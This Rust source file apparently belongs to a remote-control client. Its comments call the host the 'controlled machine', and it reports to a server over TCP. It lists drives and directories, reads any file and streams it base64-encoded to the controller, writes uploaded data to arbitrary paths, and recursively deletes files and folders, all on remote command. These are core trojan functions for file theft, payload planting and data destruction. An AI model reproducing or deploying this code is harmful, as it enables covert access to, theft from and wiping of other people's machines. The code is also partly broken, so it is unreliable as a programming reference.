use std::{fs::{self, File, OpenOptions, ReadDir}, io::{Read, Write}, path::{Path, PathBuf}, net::TcpStream, error::Error};

use crate::model::{file_entry::FileEntry, command_model::{CommandModel}, source::Source};

use super::socket_util::SocketUtil;

pub struct FileParse;

// 文件名
static mut WRITE_FILE: String = String::new();
// 接受者
static mut RECEIVER: String = String::new();
// base64数据
static mut BASE64_DATA: String = String::new();

impl FileParse {
    // 获取可用的硬盘列表信息
    #[cfg(windows)]
    pub fn get_disk_list(command_model: CommandModel, stream: &mut TcpStream){
        let json_data = serde_json::to_string(&disk_list::get_disk_list()).unwrap();
        // 组装传输对象
        let result = CommandModel::new(
            command_model.target.clone(),
            command_model.receiver.clone(), 
            command_model.c_type, 
            command_model.action, 
            json_data
        );
        // 将要传输的模型转换成json
        let json = serde_json::to_string(&result).unwrap();
        // 回传
        SocketUtil::send_to_server(json, stream);
    }

    // 通过一个路径获取目标路径下的目录/文件列表
    pub fn get_dir_list(command_model: CommandModel) -> Result<String, Box<dyn Error>> {
        // 当传入的路径为空，默认查询程序目录，否则使用传入的路径
        let read_dir = if command_model.data.eq(""){
            r"C:\Windows\Temp".to_string()
        }else {
            command_model.data
        };
        // 获得绝对路径
        let current: PathBuf = fs::canonicalize(&read_dir)?;
        // print!("get current success!{:?}", current);
        // 尝试获得目录
        let dir: ReadDir = std::fs::read_dir(read_dir)?;
        // 初始化一个文件实体数组来存放当前目录下实体信息
        let mut entry_list: Vec<FileEntry> = Vec::new();
        // 遍历当前目录下的文件实体放进数组中
        for entry in dir {
            let entry = entry?;
            let path = entry.path();
            let file_name = entry.file_name();
            let is_dir = path.is_dir();
            let file_entry = FileEntry::new(
                file_name.to_string_lossy().to_string(), 
                is_dir
            );
            entry_list.push(file_entry);
        }
        // 封装后的模型，包括当前目录和目录下的文件实体信息
        let source = Source::new(entry_list, current.to_string_lossy().to_string());
        // 将要传输的内容转换成json
        let json_data = serde_json::to_string(&source)?;
        // 组装传输对象
        let result = CommandModel::new(
            command_model.target.clone(),
            command_model.receiver.clone(), 
            command_model.c_type, 
            command_model.action, 
            json_data
        );
        // 将要传输的模型转换成json
        let json = serde_json::to_string(&result)?;
        // println!("entry list ==> {:?}", json);
        // 回传
        // SocketUtil::send_to_server(json, stream);
        Ok(json)
    }

    // // 以文本方式读取文件
    // pub fn read_file_tostr(command_model: CommandModel, stream: &mut TcpStream) {
    //     // 尝试打开一个文件
    //     let mut file =  File::open(command_model.data).unwrap();
    //     // 初始化一个字符串用于储存读取的内容
    //     let mut file_str = String::new();
    //     // 尝试读取文件内容到字符串
    //     file.read_to_string(&mut file_str).unwrap();
    //     let result = CommandModel::new(
    //         command_model.target.clone(),
    //         command_model.receiver.clone(), 
    //         command_model.c_type, 
    //         command_model.action, 
    //         file_str
    //     );
    //     let json = serde_json::to_string(&result).unwrap();
    //     SocketUtil::send_to_server(json, stream);
    // }

    // 将文件读取成字节数组返回(下载文件)
    pub fn file_to_bytes(command_model: CommandModel, stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
        extern crate base64;
        use base64::encode;
        let mut buffer = vec![];
        // 打开文件
        let mut file = File::open(command_model.data)?;
        file.read_to_end(&mut buffer)?;
        stream.write(encode(buffer).as_bytes())?;
        Ok(())
    }

    // 字节转文件(上传)
    pub fn bytes_to_file(command_model: CommandModel) -> Result<(), Box<dyn Error>> {
        // 第一步：告诉被控机：成功后到通知对象(receiver)，要写入数据的文件完整路径(write_file)
        Ok(unsafe{
            RECEIVER = command_model.receiver;
            WRITE_FILE = command_model.data;
            // 第二步：尝试在目标路径创建一个文件
            File::create(&WRITE_FILE)?;
            // println!("write_file ==> {},receiver ==> {}", WRITE_FILE, receiver);
        })
    }
    // 写入数据到文件中
    pub fn write_byte(buffer: [u8; 65536], read_size: usize) -> Result<(), Box<dyn Error>>{
        Ok(unsafe {
            let data = String::from_utf8(buffer[..read_size].to_vec()).unwrap();
            // println!("{:?}", data.len());
            BASE64_DATA.push_str(&data);
            // println!("{}", BASE64_DATA.ends_with("="));
            if(BASE64_DATA.ends_with("=")){
                let mut _file = OpenOptions::new()
                    .append(true) // 追加内容
                    .open(&WRITE_FILE)?;
                _file.write(&base64::decode(&BASE64_DATA)?)?;
            }
            // println!("{}", BASE64_DATA.len());
            // 第三步：以追加写方式打开创建的文件
            // let mut _file = OpenOptions::new()
            //     .append(true) // 追加内容
            //     .open(&WRITE_FILE)
            //     .expect("open error!");
            // // 踩坑：只写入有内容的数据
            // // 第四步：写入读取长度的内容
            // // print!("bytes ==> {:?}", &buffer[..size]);
            // _file.write(&buffer[..size]).expect("write error!");
        })
    }

    // 删除文件/目录
    pub fn remove_file_or_dir(command_model: CommandModel) -> Result<String, Box<dyn Error>> {
        // 获得一个目录对象
        let path = Path::new(&command_model.data);
        // 如果是一个目录，需要递归删除，文件直接删除
        if path.is_dir(){
            // FileParse::remove(path);
            fs::remove_dir_all(path)?;
        }else{
            fs::remove_file(path)?;
        }
        let result = CommandModel::new(
            command_model.target.clone(),
            command_model.receiver.clone(), 
            command_model.c_type, 
            command_model.action, 
            String::new()
        );
        let json = serde_json::to_string(&result).unwrap();
        // SocketUtil::send_to_server(json, stream);
        Ok(json)
    }
}